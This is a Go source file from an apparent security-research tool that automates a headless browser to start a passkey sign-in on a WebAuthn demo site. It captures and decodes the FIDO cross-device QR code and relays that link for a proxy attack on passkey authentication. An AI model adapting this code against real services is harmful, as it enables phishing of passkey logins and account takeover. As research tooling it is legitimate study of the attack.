package attacks

import (
	"context"
	"fmt"
	"log"
	"time"

	"github.com/Splinter0/CrossCheck/utils"
	"github.com/chromedp/chromedp"
	"github.com/google/uuid"
)

type PasskeyAttack struct {
	Url                string                         // Main Url to visit
	Actions            []chromedp.Action              // Actions of the headless browser
	Path               string                         // Path to host attack on
	CustomBrowserFlags []chromedp.ExecAllocatorOption // Custom flags to pass to the headless browser
	AddDiscoverable    bool                           // Will add the discoverable flag set to true to the FIDO:/ uri
}

func PasskeyVisit(attack *PasskeyAttack, comm chan string) {
	opts := append(chromedp.DefaultExecAllocatorOptions[:],
		chromedp.Flag("headless", false),
		chromedp.Flag("incognito", true),
		chromedp.UserAgent("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3830.0 Safari/537.36"),
	)
	opts = append(opts, attack.CustomBrowserFlags...)
	ctx, cancel := chromedp.NewExecAllocator(context.Background(), opts...)
	defer cancel()
	ctx, cancel = chromedp.NewContext(ctx)
	defer cancel()

	actions := append(
		[]chromedp.Action{
			chromedp.Navigate(attack.Url),
		},
		attack.Actions...,
	)

	err := chromedp.Run(ctx, actions...)
	if err != nil {
		log.Println(err)
	}

	passkeyId := uuid.New().String()
	chromedp.Run(
		ctx,
		chromedp.Sleep(5*time.Second),
		chromedp.Evaluate(fmt.Sprintf(`document.title = "%s";`, passkeyId), nil),
		chromedp.Sleep(1*time.Second),
		chromedp.ActionFunc(func(ctx context.Context) error {
			utils.FindAndScreenshotWindow(passkeyId)
			fido := utils.DecodeQRCodeFromFile("/tmp/" + passkeyId + ".png")
			if attack.AddDiscoverable {
				// Hacky lol
				// fido = strings.Replace(fido, "107096654083332", "01795946514347268245", 1)
				f, err := utils.MakeDiscoverable(fido)
				if err == nil {
					fido = f
				}
			}
			log.Println(fido)
			log.Println(utils.FidoLinkToCbor(fido))
			comm <- fido
			return nil
		}),
		chromedp.Sleep(5*time.Minute),
	)
}

func PasskeyProxyAttacks() []PasskeyAttack {
	return []PasskeyAttack{
		{
			Url:  "https://webauthn.io/",
			Path: "/webauthn",
			Actions: []chromedp.Action{
				chromedp.WaitVisible(`/html/body/header/div/div/div/div/div[1]/div/section/form/div[1]/div[1]/input`, chromedp.BySearch),
				chromedp.SendKeys(`/html/body/header/div/div/div/div/div[1]/div/section/form/div[1]/div[1]/input`, "test@example.com", chromedp.BySearch),
				chromedp.WaitVisible(`/html/body/header/div/div/div/div/div[1]/div/section/form/div[2]/div[2]/button`, chromedp.BySearch),
				chromedp.Click(`/html/body/header/div/div/div/div/div[1]/div/section/form/div[2]/div[2]/button`, chromedp.BySearch),
			},
			AddDiscoverable: true,
		},
	}
}
